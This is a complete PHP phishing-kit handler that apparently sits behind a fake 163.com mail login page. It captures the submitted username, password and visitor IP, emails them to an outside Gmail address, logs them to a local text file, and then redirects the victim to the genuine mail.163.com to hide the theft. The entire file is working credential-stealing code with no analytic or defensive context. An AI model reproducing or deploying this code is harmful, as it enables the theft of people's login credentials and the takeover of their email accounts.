<?

$ip = getenv("REMOTE_ADDR");
$message .= "Username: ".$_POST['user']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";

$recipient = "greenznation@gmail.com";
$subject = "163| ".$ip."\n";

mail($recipient,$subject,$message);

$fp = fopen("163.txt","a");
fputs($fp,$message);
fclose($fp);

header("Location:  http://mail.163.com");
?>